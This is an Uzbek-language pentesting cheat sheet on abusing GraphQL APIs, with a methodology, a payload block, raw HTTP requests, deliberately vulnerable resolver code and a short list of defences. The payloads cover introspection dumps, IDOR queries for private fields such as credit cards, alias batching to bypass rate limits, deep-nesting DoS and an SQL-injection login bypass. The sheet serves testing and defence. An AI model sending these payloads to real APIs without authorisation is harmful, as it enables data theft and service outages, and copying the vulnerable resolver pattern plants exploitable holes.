# GraphQL Abuse

## 1. Ta'rif
GraphQL — bitta endpoint, schema'ga query beriladi. Abuse: introspection leak, batching (rate-limit bypass), IDOR in queries, field leak, DoS (deep query), injection (SQLi via resolver), auth bypass in resolvers.

## 2. Qayerdan kelib chiqadi (root causes)
- Introspection ochiq → butun schema, mutatlar, internal fields
- Resolvers yetarli authorization tekshirmaydi (eksplote har query field)
- Aliases/batching — rate limit bypass (attacker bitta request'da 10k)
- Deep nested query — DoS (billion laughs grafi)
- `__schema`, `__typename` ochiq
- Error messages verbose — stack/DB leak
- Raw query string: SQLi/NoSQLi kirishi resolver'da

## 3. Turlari
| Tur | Misol |
|-----|-------|
| Introspection | `query{__schema{types{name}}}` |
| Field abuse | IDsiz private field |
| Batching | `query{__typename alias1: x(id:1){...} alias2: ...}` |
| DOS | `query{ a{a{a{a{...} } } } }` |
| Injection | resolver query string |
| Mutation IDOR | masalan update user id |

## 4. Metodologiya
1. Endpoint toping: `/graphql`, `/api/graphql`, `/graph`, `/v1/graphql`, `/gql`. 
   - POST JSON: `{"query": "..."}`
   - GET `?query=...`
   - Content-Type `application/graphql`
2. Introspection:
   ```graphql
   {"query": "{__schema { types { name fields { name args { name type { name kind } } } } }"}
   ```
3. Schema'ni chop eting (introspection query dump, e.g. via `gqlmap`, `nuclei` template).
4. Har bir query/mutation — resolvers authorization'ni sinash:
   - `user(id: 1)` → boshqa user (IDOR in gql)
   - Admin functionا ochiqmi
5. Batching: multiple aliases bitta `query` — rate shutdown.
6. Deep query DoS — depth limit borligini tekshirish.
7. SQLi payloads GraphQL'da: `login(user: "' OR 1=1-- -")` (resolver'da SQL).
8. Error verbose: `{"query": "{ }"}` error'da stack/framework print.

## 5. Payload'lar
```graphql
# Introspection
{"query": "{ __typename }"}
{"query": "{ __schema { queryType { name } mutationType { name } types { name } } }"}

# Field query (after introspection)
{"query": "{ user(id: 1) { id name email creditCard } }"}

# Batching attack
{"query": "query{ a:user(id:1){email} b:user(id:2){email} ... z:user(id:26){email} }"}

# DoS (deep recursion)
{"query": "{ a { b { c { d { e { f } } } } } }"}

# Query to login — SQLi variant
{"query": "{ login(user: \"' OR 1=1-- -\", pass: \"x\") { token } }"}
```
## 6. Request misollari
```
POST /graphql HTTP/1.1
Host: target.com
Content-Type: application/json

{"query": "{ __schema { mutationType { fields { name args { name type { name kind } } } } } }"}

GET /graphql?query=%7B%20__typename%20%7D HTTP/1.1
```
## 7. Zaif code misollari
```javascript
// ZAIF — introspection ochiq
const schema = buildSchema(fs.readFileSync('schema.graphql', 'utf8'));
app.use('/graphql', graphqlHTTP({ schema: schema, graphiql: true }));

// ZAIF — resolver auth yo'q
const Query = { user: (_, {id}) => db.users.findOne(id) };  // hech natija tegmoq yo'q
```
## 8. Nimalarga ahamiyat berish (checklist)
- [ ] Introspection (= big scoring — info leak)
- [ ] Har bir field — authorization (ordinal user'da admin field)
- [ ] Aliases — batching/rate limit
- [ ] Recursive pets (depth limit)
- [ ] Error verbose (stack/PDB)
- [ ] Mutation'da mass assignment (input type'da extra field)
- [ ] N+1 queries / DoS
- [ ] IDOR — har qanday object by ID
- [ ] `__schema` blok bo'lsa — `graphql-cop`, `clairvoyance` bypass
## 9. Himoya
- Disable introspection in prod, API key/auth on schema
- Depth / complexity limits, batch limits, persistent queries
- Authorization in resolver level (defense-in-depth)
- Generic errors, allow only whitelisted operations